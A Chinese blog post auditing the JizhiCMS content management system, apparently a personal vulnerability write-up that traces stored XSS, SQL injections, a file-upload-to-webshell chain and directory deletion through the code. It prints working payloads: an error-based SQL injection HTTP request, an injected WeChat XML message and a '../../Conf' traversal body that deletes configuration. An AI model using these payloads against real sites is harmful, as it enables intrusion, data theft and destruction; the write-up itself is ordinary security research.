---
title: 极致CMS漏洞整合与分析
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-30 17:27:49
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg
---
闲来无事，随便找个CMS审一审。

链接：https://github.com/Cherry-toto/jizhicms/releases/

随缘更新。
# 前言

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021222816.png)

若出现页面404的，请设置伪静态：https://www.kancloud.cn/toto/jizhicms/1540682

# v1.6.7

源码：https://codeload.github.com/Cherry-toto/jizhicms/zip/refs/tags/v1.6.7

## 一、存储型XSS

在发布文章标题插入恶意代码

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021230848.png)

后台管理员查看内容

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021230809.png)

相关代码在/Home/c/UserController.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021234749.png)

经过html实体化和转义，看上去不会有什么问题。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021235057.png)

但是这里并没有处理title，所以会触发。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022000134.png)

## 二、首页sql注入

调试出了点小问题，记录一下解决方案（其实是我之前写的那篇文章有点小问题，希望没人看到。。。）：https://cloud.tencent.com/developer/news/411805

以及调试时超时500的解决方法（需重启web服务）：https://blog.csdn.net/qq_36505844/article/details/105712135

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022214200.png)

关键代码在HomeController.php的jizhi()里

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022224950.png)

下个断点跟一下

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022230603.png)

可以看到我们构造的恶意代码被传入find，继续跟进

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022230708.png)

FrPHP\lib\\Model里的find方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022231830.png)

可以看到恶意代码已经被插入

原理如下

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022232046.png)

最后报错信息通过\Home\c\ErrorController.php下进行输出。

漏洞产生原因：一开始看到这个首页sql注入觉得很奇怪，跟了一遍才发现这个功能原本的目的是匹配页面内容（不知道咋形容），只是没有进行过滤，直接插入数据库执行，导致sql注入。

## 三、留言界面sql注入

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023124605.png)

下个断点跟一下

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023125050.png)

赋值

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023155924.png)

关键在这里，我们的ip和留言的信息一起传入

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160150.png)

最终执行

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160703.png)

## 四、发布文章sql注入

这个似乎是beta版本的洞

beta：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164533.png)

正式版：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164550.png)

payload

	POST /user/release.html HTTP/1.1
	Host: www.jizhi.com:1238
	Content-Length: 221
	Cache-Control: max-age=0
	Upgrade-Insecure-Requests: 1
	Origin: http://www.jizhi.com:1238
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Referer: http://www.jizhi.com:1238/user/release.html
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.9,ko;q=0.8
	Cookie: PHPSESSID=216fp73bnjss25l5tnlqtb5bmt
	Connection: close

	id=&isshow=&molds=article&tid=2'and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20'1'='1&title=1&keywords=1&litpic=&file_litpic=&description=1&submit=%E6%8F%90%E4%BA%A4&body=%3Cp%3E1%3C%2Fp%3E

# v1.7

## 一、wechat插件sql注入
对着Seay的报告审了几个都无果，记得之前看的文章提到wechat部分存在漏洞，于是直接跳到Home/c/WechatController.php。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028201040.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028201313.png)

显然这里url不可控，所以不存在任意文件读取。
但是在上下都有一个M函数，find和add似乎是和数据库交互的语句，参数除了包含不可控的user外还有一个openid

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028204034.png)

往上看可知openid是可控的xml字符串。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028215720.png)

注意格式

	<?xml version='1.0'?>
	<Troy3e>
	<MsgType>event</MsgType>
	<Event>subscribe</Event>
	<FromUserName>Troy3e'</FromUserName>
	</Troy3e>

## 二、安装插件处任意文件上传

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030155816.png)

首先要知道的是frparam这个函数

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030160040.png)

所以可知update中filepath、action、download_url等都是可控的。
继续往下看，当action传入start-download时：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030160727.png)

就是下载download_url的文件，放到tmp_path里，而tmp_path是filepath组成的，所以文件路径也是可控的。
但是我们不能直接下载php文件，既是因为不知道是否允许上传php，更重要的是tmp_path强制加了zip后缀。

寻找一下解压的功能

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164411.png)

成功上传

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164851.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164936.png)

路径为：http://www.jizhi.com:1238/A/exts/shell.php

## 任意文件夹下载

也是frparam函数的原因，很简单

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030165648.png)

## 后台配置文件删除

还是frprarm的问题。。。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030170005.png)

只要包含config.php，就会把整个文件夹删除

post

path=../../Conf&type=2

